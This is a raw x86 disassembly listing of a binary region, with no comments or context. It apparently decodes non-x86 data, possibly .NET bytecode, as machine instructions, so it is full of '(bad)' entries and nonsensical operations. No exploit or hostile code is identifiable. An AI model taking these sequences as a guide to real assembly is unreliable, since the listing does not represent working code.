110040b6:	sub    eax,DWORD PTR [ebx]
110040b8:	push   ss
110040b9:	sub    eax,DWORD PTR [eax]
110040bb:	sub    al,0x0
110040bd:	sub    eax,DWORD PTR [eax]
110040bf:	jle    0x110040c4
110040c1:	add    BYTE PTR [eax],al
110040c3:	add    al,0x2
110040c5:	sub    BYTE PTR [edi],al
110040c7:	add    BYTE PTR [eax],al
110040c9:	push   es
110040ca:	outs   dx,DWORD PTR ds:[esi]
110040cb:	aaa    
110040cc:	add    BYTE PTR [eax],al
110040ce:	or     al,BYTE PTR [eax]
110040d0:	and    BYTE PTR [ecx],al
110040d2:	add    BYTE PTR [eax],al
110040d4:	add    BYTE PTR [ebx],cl
110040d6:	sub    ebp,DWORD PTR [edx+0x2a002b]
110040dc:	adc    esi,DWORD PTR [eax]
110040de:	add    eax,DWORD PTR [eax]
110040e0:	and    eax,0x0
110040e5:	add    BYTE PTR [eax],al
110040e7:	add    BYTE PTR [edi],dl
110040e9:	sub    eax,DWORD PTR [ebx]
110040eb:	push   ss
110040ec:	sub    eax,DWORD PTR [eax]
110040ee:	sub    al,0x0
110040f0:	add    BYTE PTR [edx],al
110040f2:	sub    BYTE PTR [ecx],cl
110040f4:	add    BYTE PTR [eax],al
110040f6:	push   es
110040f7:	add    BYTE PTR [esi+0x3],bh
110040fa:	add    BYTE PTR [eax],al
110040fc:	add    al,0x2
110040fe:	sub    BYTE PTR [edi],al
11004100:	add    BYTE PTR [eax],al
11004102:	push   es
11004103:	push   ss
11004104:	inc    BYTE PTR [ecx]
11004106:	outs   dx,DWORD PTR ds:[esi]
11004107:	cmp    BYTE PTR [eax],al
11004109:	add    BYTE PTR [edx],cl
1100410b:	add    BYTE PTR [edx],ch
1100410d:	add    BYTE PTR [eax],al
1100410f:	add    BYTE PTR [ebx],bl
11004111:	xor    BYTE PTR ds:0xa7700,al
11004117:	add    BYTE PTR [ecx],cl
11004119:	add    BYTE PTR [eax],al
1100411b:	adc    DWORD PTR [esi],edx
1100411d:	adc    edx,DWORD PTR [ebx]
1100411f:	adc    DWORD PTR [ebx],edx
11004121:	inc    ebp
11004122:	add    DWORD PTR [eax],eax
11004124:	add    BYTE PTR [eax],al
11004126:	add    BYTE PTR [eax],al
11004128:	add    BYTE PTR [eax],al
1100412a:	cmp    BYTE PTR [edi],al
1100412c:	add    DWORD PTR [eax],eax
1100412e:	add    BYTE PTR [ecx],dl
11004130:	adc    eax,DWORD PTR [ebp+0x40]
11004133:	add    BYTE PTR [eax],al
11004135:	add    BYTE PTR [eax+eax*1+0x0],ah
11004139:	add    BYTE PTR [edx+eax*1+0x0],al
1100413d:	add    BYTE PTR [edx],cl
1100413f:	add    al,0x0
11004141:	add    ah,cl
11004143:	add    eax,DWORD PTR [eax]
11004145:	add    bh,al
11004147:	add    eax,0x3b90000
1100414c:	add    BYTE PTR [eax],al
1100414e:	pop    ss
1100414f:	add    al,BYTE PTR [eax]
11004151:	add    BYTE PTR [eax-0x5f000000],al
11004157:	add    eax,0x2da0000
1100415c:	add    BYTE PTR [eax],al
1100415e:	inc    esi
1100415f:	add    al,0x0
11004161:	add    BYTE PTR [edx+eax*1+0x0],ah
11004165:	add    BYTE PTR [ecx+eax*1+0x0],ch
11004169:	add    BYTE PTR [ecx],cl
1100416b:	add    DWORD PTR [eax],eax
1100416d:	add    BYTE PTR [ecx+0x1],bl
11004170:	add    BYTE PTR [eax],al
11004172:	sbb    ecx,DWORD PTR [ecx]
11004174:	add    BYTE PTR [eax],al
11004176:	push   ebx
11004177:	add    BYTE PTR [eax],al
11004179:	add    dl,bl
1100417b:	or     BYTE PTR [eax],al
1100417d:	add    BYTE PTR [ebx],dh
1100417f:	add    al,BYTE PTR [eax]
11004181:	add    BYTE PTR [eax],cl
11004183:	or     DWORD PTR [eax],eax
11004185:	add    BYTE PTR [eax+0x2],bh
11004188:	add    BYTE PTR [eax],al
1100418a:	stc    
1100418b:	add    BYTE PTR [eax],al
1100418d:	add    BYTE PTR [ebp-0x2efffff8],dl
11004193:	add    al,0x0
11004195:	add    BYTE PTR [ebx+eax*1],bh
11004198:	add    BYTE PTR [eax],al
1100419a:	std    
1100419b:	add    al,0x0
1100419d:	add    BYTE PTR [ecx+0x29000000],dl
110041a3:	add    eax,DWORD PTR [eax]
110041a5:	add    BYTE PTR [ebx],bl
110041a7:	add    al,0x0
110041a9:	add    BYTE PTR [ebx+0x16000002],bl
110041af:	add    eax,DWORD PTR [eax]
110041b1:	add    BYTE PTR [ebx-0x4afffffd],dl
110041b7:	add    DWORD PTR [eax],eax
110041b9:	add    ah,bh
110041bb:	add    eax,0x1a40000
110041c0:	add    BYTE PTR [eax],al
110041c2:	test   al,0x8
110041c4:	add    BYTE PTR [eax],al
110041c6:	jns    0x110041d0
110041c8:	add    BYTE PTR [eax],al
110041ca:	loop   0x110041d1
110041cc:	add    BYTE PTR [eax],al
110041ce:	out    0x1,eax
110041d0:	add    BYTE PTR [eax],al
110041d2:	mov    DWORD PTR [edx],0x5590000
110041d8:	add    BYTE PTR [eax],al
110041da:	add    BYTE PTR ds:[eax],al
110041dd:	add    BYTE PTR [ebp+0x3],cl
110041e0:	add    BYTE PTR [eax],al
110041e2:	mov    ecx,0xea000000
110041e7:	add    al,0x0
110041e9:	add    BYTE PTR [esi+0x7d000005],al
110041ef:	add    DWORD PTR [eax],eax
110041f1:	add    ah,bl
110041f3:	add    eax,DWORD PTR [eax]
110041f5:	add    BYTE PTR [esi+0x75000003],ah
110041fb:	add    eax,0x1460000
11004200:	add    BYTE PTR [eax],al
11004202:	push   edi
11004203:	or     DWORD PTR [eax],eax
11004205:	add    BYTE PTR [edx-0x4bfffffc],al
1100420b:	add    eax,0x1d60000
11004210:	add    BYTE PTR [eax],al
11004212:	cli    
11004213:	add    DWORD PTR [eax],eax
11004215:	add    BYTE PTR [edx],bl
11004217:	add    DWORD PTR [eax],eax
11004219:	add    BYTE PTR [edi-0x74fffff8],bh
1100421f:	add    al,BYTE PTR [eax]
11004221:	add    BYTE PTR [ecx+0x4],bl
11004224:	add    BYTE PTR [eax],al
11004226:	mov    esi,0xeb000004
1100422b:	or     BYTE PTR [eax],al
1100422d:	add    bl,ch
1100422f:	add    al,BYTE PTR [eax]
11004231:	add    BYTE PTR [esi],cl
11004233:	add    eax,0x2000000
11004238:	sub    BYTE PTR [ecx],cl
1100423a:	add    BYTE PTR [eax],al
1100423c:	push   es
1100423d:	add    BYTE PTR [edx],al
1100423f:	pop    ss
11004240:	lea    esp,[edx]
11004242:	add    BYTE PTR [eax],al
11004244:	add    DWORD PTR [ebx],edx
11004246:	push   cs
11004247:	adc    DWORD PTR [esi],ecx
11004249:	push   ss
1100424a:	pop    ds
1100424b:	sub    al,0x9d
1100424d:	adc    DWORD PTR [esi],ecx
1100424f:	outs   dx,DWORD PTR ds:[esi]
11004250:	xor    eax,0xa0a0000
11004255:	jle    0x1100425a
11004257:	add    BYTE PTR [eax],al
11004259:	add    al,0x6f
1100425b:	cmp    DWORD PTR [eax],eax
1100425d:	add    BYTE PTR [edx],cl
1100425f:	or     esi,DWORD PTR [edx-0x4d]
11004262:	add    DWORD PTR [eax],eax
11004264:	jo     0x11004272
11004266:	push   ss
11004267:	or     eax,0x2920
1100426c:	add    BYTE PTR [ebx],dl
1100426e:	adc    edi,DWORD PTR [eax]
11004270:	mov    ebx,0x38fffffe
11004275:	xchg   ebx,eax
11004276:	add    al,0x0
11004278:	add    BYTE PTR [ecx],cl
1100427a:	pop    ss
1100427b:	pop    eax
1100427c:	or     eax,0x1020
11004281:	add    BYTE PTR [ebx],dl
11004283:	adc    edi,DWORD PTR [eax]
11004285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11004286:	(bad)  
11004287:	(bad)  
11004288:	(bad)  
11004289:	cmp    BYTE PTR [esi+0x4],bh
1100428c:	add    BYTE PTR [eax],al
1100428e:	and    BYTE PTR [eax],al
11004290:	add    BYTE PTR [eax],al
11004292:	add    BYTE PTR [ebx],dl
11004294:	adc    edi,DWORD PTR [eax]
11004296:	xchg   ebp,eax
11004297:	(bad)  
11004298:	(bad)  
11004299:	call   DWORD PTR [ecx]
1100429b:	pop    es
1100429c:	adc    DWORD PTR [edi+ebp*2],eax
1100429f:	sbb    DWORD PTR [eax],eax
110042a1:	add    BYTE PTR [edx],cl
110042a3:	pop    ss
110042a4:	pop    ecx
110042a5:	cmp    al,0xf9
110042a7:	pop    es
110042a8:	add    BYTE PTR [eax],al
110042aa:	and    BYTE PTR [edi],al
110042ac:	add    BYTE PTR [eax],al
110042ae:	add    BYTE PTR [ebx],dl
110042b0:	adc    edi,DWORD PTR [eax]
110042b2:	jns    0x110042b2
110042b4:	(bad)  
110042b5:	(bad)  
110042b6:	cmp    BYTE PTR [ecx+0x20000000],cl
110042bc:	sbb    al,BYTE PTR [eax]
110042be:	add    BYTE PTR [eax],al
110042c0:	adc    edx,DWORD PTR [ebx]
110042c2:	cmp    BYTE PTR [eax-0x2],ch
110042c5:	(bad)  
110042c6:	call   DWORD PTR [ecx]
110042c8:	add    al,0x11
110042ca:	add    al,0x6f
110042cc:	sbb    DWORD PTR [eax],eax
110042ce:	add    BYTE PTR [edx],cl
110042d0:	pop    ss
110042d1:	pop    ecx
110042d2:	outs   dx,DWORD PTR ds:[esi]
110042d3:	sbb    BYTE PTR [eax],al
110042d5:	add    BYTE PTR [edx],cl
110042d7:	pop    ds
110042d8:	and    bh,dh
110042da:	add    DWORD PTR [esi],edx
110042dc:	inc    BYTE PTR [ecx]
110042de:	cmp    al,dl
110042e0:	add    DWORD PTR [eax],eax
110042e2:	add    BYTE PTR [eax],ah
110042e4:	sub    eax,DWORD PTR [eax]
110042e6:	add    BYTE PTR [eax],al
110042e8:	adc    edx,DWORD PTR [ebx]
110042ea:	cmp    BYTE PTR [eax-0x2],al
110042ed:	(bad)  
110042ee:	call   DWORD PTR [ecx]
110042f0:	add    al,0x16
110042f2:	outs   dx,DWORD PTR ds:[esi]
110042f3:	sbb    BYTE PTR [eax],al
110042f5:	add    BYTE PTR [edx],cl
110042f7:	pop    ds
110042f8:	sub    eax,0xfe1601fe
110042fd:	add    DWORD PTR [eax],edi
110042ff:	jle    0x11004301
11004301:	add    BYTE PTR [eax],al
11004303:	add    BYTE PTR [ecx],dl
11004305:	or     BYTE PTR [eax],ch
11004307:	cmp    al,BYTE PTR [eax]
11004309:	add    BYTE PTR [edx],cl
1100430b:	adc    DWORD PTR [eax],ecx
1100430d:	sub    BYTE PTR [eax],dh
1100430f:	add    BYTE PTR [eax],al
11004311:	or     dh,BYTE PTR [ebx+0x3b]
11004314:	add    BYTE PTR [eax],al
11004316:	or     dl,BYTE PTR [ebx]
11004318:	or     dl,BYTE PTR [ecx]
1100431a:	or     dl,BYTE PTR [ecx]
1100431c:	add    eax,0x3c6f
11004321:	or     al,BYTE PTR [eax]
11004323:	and    BYTE PTR ds:0x13000000,dl
11004329:	adc    edi,DWORD PTR [eax]
1100432b:	add    dh,bh
1100432d:	(bad)  
1100432e:	call   DWORD PTR [ecx]
11004330:	push   es
11004331:	sub    eax,0xd2074
11004336:	add    BYTE PTR [eax],al
11004338:	adc    edx,DWORD PTR [ebx]
1100433a:	cmp    al,dh
1100433c:	std    
1100433d:	(bad)  
1100433e:	(bad)  
1100433f:	cmp    cl,dl
11004341:	add    DWORD PTR [eax],eax
11004343:	add    BYTE PTR [eax],ah
11004345:	cmp    BYTE PTR [eax],al
11004347:	add    BYTE PTR [eax],al
11004349:	adc    edx,DWORD PTR [ebx]
1100434b:	cmp    bh,bl
1100434d:	std    
1100434e:	(bad)  
1100434f:	call   DWORD PTR [ecx]
11004351:	add    al,0x11
11004353:	pop    es
11004354:	pop    ss
11004355:	pop    eax
11004356:	outs   dx,DWORD PTR ds:[esi]
11004357:	sbb    BYTE PTR [eax],al
11004359:	add    BYTE PTR [edx],cl
1100435b:	pop    ds
1100435c:	pop    esp
1100435d:	inc    BYTE PTR [ecx]
1100435f:	cmp    ch,ch
11004361:	add    DWORD PTR [eax],eax
11004363:	add    BYTE PTR [eax],al
11004365:	adc    DWORD PTR [eax],ecx
11004367:	or     BYTE PTR [eax],ch
11004369:	cmp    eax,0x130a0000
1100436e:	or     DWORD PTR [eax],eax
11004370:	and    BYTE PTR [edx],dh
11004372:	add    BYTE PTR [eax],al
11004374:	add    BYTE PTR [ebx],dl
11004376:	adc    edi,DWORD PTR [eax]
11004378:	mov    bl,0xfd
1100437a:	(bad)  
1100437b:	(bad)  
1100437c:	cmp    BYTE PTR [edi+eax*1],dh
1100437f:	add    BYTE PTR [eax],al
11004381:	adc    ecx,DWORD PTR [edi]
11004383:	and    BYTE PTR [esi],cl
11004385:	add    BYTE PTR [eax],al
11004387:	add    BYTE PTR [ebx],dl
11004389:	adc    edi,DWORD PTR [eax]
1100438b:	mov    al,ds:0x11fffffd
11004390:	(bad)  
11004393:	add    BYTE PTR [eax],al
11004395:	add    BYTE PTR [eax],ah
11004397:	or     al,0x0
11004399:	add    BYTE PTR [eax],al
1100439b:	adc    edx,DWORD PTR [ebx]
1100439d:	cmp    BYTE PTR [ebp+0x38fffffd],cl
110043a3:	jo     0x110043a7
110043a5:	add    BYTE PTR [eax],al
110043a7:	and    BYTE PTR [esi],ch
110043a9:	add    BYTE PTR [eax],al
110043ab:	add    BYTE PTR [ebx],dl
110043ad:	adc    edi,DWORD PTR [eax]
110043af:	jl     0x110043ae
110043b1:	(bad)  
110043b2:	call   DWORD PTR [edi]
110043b4:	cmp    BYTE PTR [ebx],bh
110043b6:	add    al,BYTE PTR [eax]
110043b8:	add    BYTE PTR [eax],al
110043ba:	adc    DWORD PTR [edi+edx*1],eax
110043bd:	adc    DWORD PTR [edi+ebp*2],eax
110043c0:	sbb    DWORD PTR [eax],eax
110043c2:	add    BYTE PTR [edx],cl
110043c4:	sbb    BYTE PTR [ecx+0x6f],bl
110043c7:	das    
110043c8:	add    BYTE PTR [eax],al
110043ca:	or     dl,BYTE PTR [ebx]
110043cc:	add    al,0x0
110043ce:	and    BYTE PTR [edx],ah
110043d0:	add    BYTE PTR [eax],al
110043d2:	add    BYTE PTR [ebx],dl
110043d4:	adc    edi,DWORD PTR [eax]
110043d6:	push   ebp
110043d7:	std    
110043d8:	(bad)  
110043d9:	(bad)  
110043da:	cmp    bh,dh
110043dc:	add    BYTE PTR [eax],al
110043de:	add    BYTE PTR [eax],ah
110043e0:	and    BYTE PTR [eax],al
110043e2:	add    BYTE PTR [eax],al
110043e4:	adc    edx,DWORD PTR [ebx]
110043e6:	cmp    BYTE PTR [ebp+edi*8-0x1],al
110043ea:	call   DWORD PTR [edi]
110043ec:	cmp    dl,al
110043ee:	add    BYTE PTR [eax],al
110043f0:	add    BYTE PTR [ecx],dl
110043f2:	or     edx,DWORD PTR [ecx]
110043f4:	or     ch,BYTE PTR [edi+0x3e]
110043f7:	add    BYTE PTR [eax],al
110043f9:	or     ch,BYTE PTR [edi+0x3c]
110043fc:	add    BYTE PTR [eax],al
110043fe:	or     al,BYTE PTR [eax]
11004400:	and    BYTE PTR [esi],dh
11004402:	add    BYTE PTR [eax],al
11004404:	add    BYTE PTR [ebx],dl
11004406:	adc    edi,DWORD PTR [eax]
11004408:	and    edi,ebp
1100440a:	(bad)  
1100440b:	(bad)  
1100440c:	cmp    BYTE PTR [esi],ch
1100440e:	add    DWORD PTR [eax],eax
11004410:	add    BYTE PTR [eax],ah
11004412:	add    BYTE PTR es:[eax],al
11004415:	add    BYTE PTR [ebx],dl
11004417:	adc    edi,DWORD PTR [eax]
11004419:	adc    bh,ch
1100441b:	(bad)  
1100441c:	call   DWORD PTR [esi]
1100441e:	cmp    BYTE PTR [esi-0x1],bl
11004421:	(bad)  
11004422:	inc    DWORD PTR [eax]
11004424:	and    BYTE PTR [edi],dh
11004426:	add    BYTE PTR [eax],al
11004428:	add    BYTE PTR [ebx],dl
1100442a:	adc    edi,DWORD PTR [eax]
1100442c:	(bad)  
1100442d:	cld    
1100442e:	(bad)  
1100442f:	(bad)  
11004430:	cmp    BYTE PTR [esi+edi*8-0x1],al
11004434:	call   DWORD PTR [ecx]
11004436:	add    al,0x28
11004438:	or     BYTE PTR [eax],al
1100443a:	add    BYTE PTR [esi],al
1100443c:	adc    ecx,DWORD PTR [eax]
1100443e:	adc    al,0x13
11004440:	or     DWORD PTR [eax],esp
11004442:	push   es
11004443:	add    BYTE PTR [eax],al
11004445:	add    BYTE PTR [ebx],dl
11004447:	adc    edi,DWORD PTR [eax]
11004449:	loop   0x11004447
1100444b:	(bad)  
1100444c:	dec    DWORD PTR [eax]
1100444e:	jb     0x11004403
11004450:	add    DWORD PTR [eax],eax
11004452:	jo     0x1100447c
11004454:	aas    
11004455:	add    BYTE PTR [eax],al
11004457:	or     bh,BYTE PTR [ecx]
11004459:	mov    eax,0x20000006
1100445e:	adc    al,BYTE PTR [eax]
11004460:	add    BYTE PTR [eax],al
11004462:	adc    edx,DWORD PTR [ebx]
11004464:	cmp    dh,al
11004466:	cld    
11004467:	(bad)  
11004468:	(bad)  
11004469:	cmp    BYTE PTR [ecx],cl
1100446b:	add    DWORD PTR [eax],eax
1100446d:	add    BYTE PTR [eax],ah
1100446f:	add    DWORD PTR [eax],eax
11004471:	add    BYTE PTR [eax],al
11004473:	adc    edx,DWORD PTR [ebx]
11004475:	cmp    BYTE PTR [ebp+0x16fffffc],dh
1100447b:	cmp    BYTE PTR [ebx+eax*1+0x0],bl
1100447f:	add    BYTE PTR [ecx],dl
11004481:	add    al,0x72
11004483:	ret    
11004484:	add    DWORD PTR [eax],eax
11004486:	jo     0x110044f7
11004488:	inc    eax
11004489:	add    BYTE PTR [eax],al
1100448b:	or     dl,BYTE PTR [ebx]
1100448d:	pop    es
1100448e:	and    BYTE PTR [ebx],cl
11004490:	add    BYTE PTR [eax],al
11004492:	add    BYTE PTR [ebx],dl
11004494:	adc    edi,DWORD PTR [eax]
11004496:	xchg   ebp,eax
11004497:	cld    
11004498:	(bad)  
11004499:	call   DWORD PTR [ecx]
1100449b:	pop    es
1100449c:	push   ss
1100449d:	add    DWORD PTR ds:[esi],eax
110044a0:	add    BYTE PTR [eax],al
110044a2:	and    BYTE PTR [eax+eax*1],dl
110044a5:	add    BYTE PTR [eax],al
110044a7:	adc    edx,DWORD PTR [ebx]
110044a9:	cmp    BYTE PTR [ecx+0x38fffffc],al
110044af:	(bad)  
110044b1:	(bad)  
110044b2:	call   DWORD PTR [ebx]
110044b4:	mov    edx,cr7
110044b7:	add    BYTE PTR [eax],al
110044b9:	add    BYTE PTR [ebx],dl
110044bb:	adc    edi,DWORD PTR [eax]
110044bd:	outs   dx,BYTE PTR ds:[esi]
110044be:	cld    
110044bf:	(bad)  
110044c0:	call   DWORD PTR [ecx]
110044c2:	cvtps2pi mm2,QWORD PTR [ecx]
110044c5:	and    BYTE PTR ds:0x13000000,bl
110044cb:	adc    edi,DWORD PTR [eax]
110044cd:	pop    esi
110044ce:	cld    
110044cf:	(bad)  
110044d0:	(bad)  
110044d1:	cmp    bl,ah
110044d3:	(bad)  
110044d4:	(bad)  
110044d5:	call   DWORD PTR [ecx]
110044d7:	add    al,0x7e
110044d9:	xor    DWORD PTR [eax],eax
110044db:	add    BYTE PTR [edx],cl
110044dd:	mov    WORD PTR [edx],fs
110044df:	add    BYTE PTR [eax],al
110044e1:	add    DWORD PTR [eax],ebp
110044e3:	inc    ecx
110044e4:	add    BYTE PTR [eax],al
110044e6:	or     ch,BYTE PTR [edi+0x23]
110044e9:	add    BYTE PTR [eax],al
110044eb:	or     dl,BYTE PTR [esi]
110044ed:	inc    BYTE PTR [ecx]
110044ef:	adc    ecx,DWORD PTR [edi]
110044f1:	and    BYTE PTR [edi],ah
110044f3:	add    BYTE PTR [eax],al
110044f5:	add    BYTE PTR [ebx],dl
110044f7:	adc    edi,DWORD PTR [eax]
110044f9:	xor    bh,ah
110044fb:	(bad)  
110044fc:	call   DWORD PTR [ecx]
110044fe:	(bad)  
11004501:	(bad)  
11004502:	(bad)  
11004503:	jmp    DWORD PTR [eax]
11004505:	or     DWORD PTR [eax],eax
11004507:	add    BYTE PTR [eax],al
11004509:	adc    edx,DWORD PTR [ebx]
1100450b:	cmp    BYTE PTR [edi],bl
1100450d:	cld    
1100450e:	(bad)  
1100450f:	(bad)  
11004510:	cmp    BYTE PTR [edi+0x1],bh
11004513:	add    BYTE PTR [eax],al
11004515:	and    BYTE PTR [esi],bh
11004517:	add    BYTE PTR [eax],al
11004519:	add    BYTE PTR [ebx],dl
1100451b:	adc    edi,DWORD PTR [eax]
1100451d:	push   cs
1100451e:	cld    
1100451f:	(bad)  
11004520:	call   DWORD PTR [ecx]
11004522:	add    al,0x28
11004524:	and    DWORD PTR [eax],eax
11004526:	add    BYTE PTR [edx],cl
11004528:	outs   dx,DWORD PTR ds:[esi]
11004529:	and    al,BYTE PTR [eax]
1100452b:	add    BYTE PTR [edx],cl
1100452d:	jb     0x1100454c
1100452f:	add    eax,DWORD PTR [eax]
11004531:	jo     0x110045a2
11004533:	and    eax,DWORD PTR [eax]
11004535:	add    BYTE PTR [edx],cl
11004537:	push   ss
11004538:	inc    BYTE PTR [ecx]
1100453a:	cmp    BYTE PTR [ebp+0x0],dh
11004540:	and    BYTE PTR [esi],bl
11004542:	add    BYTE PTR [eax],al
11004544:	add    BYTE PTR [ebx],dl
11004546:	adc    edi,DWORD PTR [eax]
11004548:	jecxz  0x11004545
1100454a:	(bad)  
1100454b:	(bad)  
1100454c:	cmp    dl,dl
1100454e:	(bad)  
1100454f:	(bad)  
11004550:	call   DWORD PTR [ebx]
11004552:	mov    ebx,cr3
11004555:	add    BYTE PTR [eax],al
11004557:	add    BYTE PTR [ebx],dl
11004559:	adc    edi,DWORD PTR [eax]
1100455b:	sar    bl,1
1100455d:	(bad)  
1100455e:	call   DWORD PTR [ecx]
11004560:	(bad)  
11004563:	add    al,BYTE PTR [eax]
11004565:	add    BYTE PTR [eax],ah
11004567:	sbb    BYTE PTR [eax],al
11004569:	add    BYTE PTR [eax],al
1100456b:	adc    edx,DWORD PTR [ebx]
1100456d:	cmp    BYTE PTR [ebp+0x38fffffb],bh
11004573:	inc    esi
11004574:	add    DWORD PTR [eax],eax
11004576:	add    BYTE PTR [eax],ah
11004578:	sub    al,BYTE PTR [eax]
1100457a:	add    BYTE PTR [eax],al
1100457c:	adc    edx,DWORD PTR [ebx]
1100457e:	cmp    BYTE PTR [ebx+edi*8+0x1408ffff],ch
11004585:	inc    BYTE PTR [ecx]
11004587:	sub    eax,DWORD PTR [ebp+0x0]
1100458a:	adc    DWORD PTR [ecx],ecx
1100458c:	jle    0x11004591
1100458e:	add    BYTE PTR [eax],al
11004590:	add    al,0x6f
11004592:	inc    edx
11004593:	add    BYTE PTR [eax],al
11004595:	or     ch,BYTE PTR [edi+0x43]
11004598:	add    BYTE PTR [eax],al
1100459a:	or     al,BYTE PTR [eax]
1100459c:	adc    DWORD PTR [ecx],ecx
1100459e:	jae    0x110045e4
110045a0:	add    BYTE PTR [eax],al
110045a2:	or     dl,BYTE PTR [ebx]
110045a4:	or     al,0x7
110045a6:	adc    DWORD PTR [edi+ebp*2],ecx
110045a9:	inc    ebp
110045aa:	add    BYTE PTR [eax],al
110045ac:	or     ah,BYTE PTR [esi]
110045ae:	add    BYTE PTR [ecx],dl
110045b0:	or     DWORD PTR [edi+0x46],ebp
110045b3:	add    BYTE PTR [eax],al
110045b5:	or     ch,BYTE PTR [edi+0x47]
110045b8:	add    BYTE PTR [eax],al
110045ba:	or     dl,BYTE PTR [ebx]
110045bc:	adc    DWORD PTR [eax],esp
110045be:	pop    ds
110045bf:	add    BYTE PTR [eax],al
110045c1:	add    BYTE PTR [ebx],dl
110045c3:	adc    edi,DWORD PTR [eax]
110045c5:	data16 sti 
110045c7:	(bad)  
110045c8:	(bad)  
110045c9:	cmp    BYTE PTR [ecx+0x2],ch
110045cc:	add    BYTE PTR [eax],al
110045ce:	adc    ecx,DWORD PTR [edi]
110045d0:	and    BYTE PTR [eax],dh
110045d2:	add    BYTE PTR [eax],al
110045d4:	add    BYTE PTR [ebx],dl
110045d6:	adc    edi,DWORD PTR [eax]
110045d8:	push   ebx
110045d9:	sti    
110045da:	(bad)  
110045db:	call   DWORD PTR [ecx]
110045dd:	(bad)  
110045e0:	add    DWORD PTR [eax],eax
110045e2:	add    BYTE PTR [eax],ah
110045e4:	add    eax,0x13000000
110045e9:	adc    edi,DWORD PTR [eax]
110045eb:	inc    eax
110045ec:	sti    
110045ed:	(bad)  
110045ee:	(bad)  
110045ef:	cmp    BYTE PTR [eax-0x3],dh
110045f2:	(bad)  
110045f3:	call   DWORD PTR [ebx]
110045f5:	mov    ebx,cr0
110045f8:	add    BYTE PTR [eax],al
110045fa:	add    BYTE PTR [ebx],dl
110045fc:	adc    edi,DWORD PTR [eax]
110045fe:	sub    eax,0x11fffffb
11004603:	cvtps2pi mm2,QWORD PTR [eax+0x20]
11004607:	das    
11004608:	add    BYTE PTR [eax],al
1100460a:	add    BYTE PTR [ebx],dl
1100460c:	adc    edi,DWORD PTR [eax]
1100460e:	sbb    eax,0x38fffffb
11004613:	aas    
11004614:	add    DWORD PTR [eax],eax
11004616:	add    BYTE PTR [eax],al
11004618:	adc    DWORD PTR [esi+edx*1],eax
1100461b:	outs   dx,DWORD PTR ds:[esi]
1100461c:	sbb    BYTE PTR [eax],al
1100461e:	add    BYTE PTR [edx],cl
11004620:	pop    ds
11004621:	sub    edi,esi
11004623:	add    DWORD PTR [ebx],edx
11004625:	add    eax,0x6f170411
1100462a:	sub    eax,0x130a0000
1100462f:	add    al,0x17
11004631:	adc    eax,DWORD PTR [esi]
11004633:	add    BYTE PTR [eax],ah
11004635:	add    al,BYTE PTR [eax]
11004637:	add    BYTE PTR [eax],al
11004639:	adc    edx,DWORD PTR [ebx]
1100463b:	cmp    bh,ch
1100463d:	cli    
1100463e:	(bad)  
1100463f:	(bad)  
11004640:	cmp    BYTE PTR [ebx],bh
11004642:	(bad)  
11004643:	(bad)  
11004644:	jmp    DWORD PTR [eax]
11004646:	sbb    al,0x0
11004648:	add    BYTE PTR [eax],al
1100464a:	adc    edx,DWORD PTR [ebx]
1100464c:	cmp    dh,bl
1100464e:	cli    
1100464f:	(bad)  
11004650:	(bad)  
11004651:	cmp    BYTE PTR [ebx],ah
11004653:	cld    
11004654:	(bad)  
11004655:	(bad)  
11004656:	jle    0x1100465b
11004658:	add    BYTE PTR [eax],al
1100465a:	add    al,0x11
1100465c:	or     ch,BYTE PTR [edi+0x48]
1100465f:	add    BYTE PTR [eax],al
11004661:	or     ch,BYTE PTR [edi+0x49]
11004664:	add    BYTE PTR [eax],al
11004666:	or     dl,BYTE PTR [ebx]
11004668:	or     edx,DWORD PTR [ecx]
1100466a:	or     edx,DWORD PTR [esi+edi*8]
1100466d:	add    DWORD PTR [ebx],edx
1100466f:	mov    edx,cr1
11004672:	add    BYTE PTR [eax],al
11004674:	add    BYTE PTR [ebx],dl
11004676:	adc    edi,DWORD PTR [eax]
11004678:	mov    bl,0xfa
1100467a:	(bad)  
1100467b:	call   DWORD PTR [ecx]
1100467d:	(bad)  
11004680:	add    DWORD PTR [eax],eax
11004682:	add    BYTE PTR [eax],ah
11004684:	cmp    eax,DWORD PTR [eax]
11004686:	add    BYTE PTR [eax],al
11004688:	adc    edx,DWORD PTR [ebx]
1100468a:	cmp    BYTE PTR [eax+0x38fffffa],ah
11004690:	pop    ebp
11004691:	std    
11004692:	(bad)  
11004693:	inc    DWORD PTR [eax]
11004695:	adc    DWORD PTR [esi+edx*1],eax
11004698:	adc    DWORD PTR [esi+edi*2],eax
1100469b:	xor    DWORD PTR [eax],eax
1100469d:	add    BYTE PTR [edx],cl
1100469f:	outs   dx,DWORD PTR ds:[esi]
110046a0:	dec    edx
110046a1:	add    BYTE PTR [eax],al
110046a3:	or     ch,BYTE PTR [edi+0x2f]
110046a6:	add    BYTE PTR [eax],al
110046a8:	or     dl,BYTE PTR [ebx]
110046aa:	add    al,0x0
110046ac:	and    BYTE PTR [eax+eax*1],dh
110046af:	add    BYTE PTR [eax],al
110046b1:	adc    edx,DWORD PTR [ebx]
110046b3:	cmp    BYTE PTR [edi-0x6],dh
110046b6:	(bad)  
110046b7:	(bad)  
110046b8:	cmp    BYTE PTR [eax-0x3],bh
110046bb:	(bad)  
110046bc:	inc    DWORD PTR [eax]
110046be:	adc    DWORD PTR [ecx+edx*1],eax
110046c1:	pop    es
110046c2:	pop    ss
110046c3:	pop    eax
110046c4:	outs   dx,DWORD PTR ds:[esi]
110046c5:	sub    eax,0xc0a0000
110046ca:	adc    DWORD PTR [esi+edx*1],eax
110046cd:	adc    DWORD PTR [edi],eax
110046cf:	outs   dx,DWORD PTR ds:[esi]
110046d0:	das    
110046d1:	add    BYTE PTR [eax],al
110046d3:	or     dl,BYTE PTR [ebx]
110046d5:	add    al,0x28
110046d7:	dec    ebx
110046d8:	add    BYTE PTR [eax],al
110046da:	or     cl,BYTE PTR [eax]
110046dc:	outs   dx,DWORD PTR ds:[esi]
110046dd:	dec    esp
110046de:	add    BYTE PTR [eax],al
110046e0:	or     ch,BYTE PTR [edi+0x4d]
110046e3:	add    BYTE PTR [eax],al
110046e5:	or     dl,BYTE PTR [ebx]
110046e7:	mov    esp,cr7
110046ea:	add    BYTE PTR [eax],al
110046ec:	add    BYTE PTR [ebx],dl
110046ee:	adc    edi,DWORD PTR [eax]
110046f0:	cmp    edi,edx
110046f2:	(bad)  
110046f3:	call   DWORD PTR [ecx]
110046f5:	(bad)  
110046f8:	add    al,0x0
110046fa:	add    BYTE PTR [eax],ah
110046fc:	pop    ss
110046fd:	add    BYTE PTR [eax],al
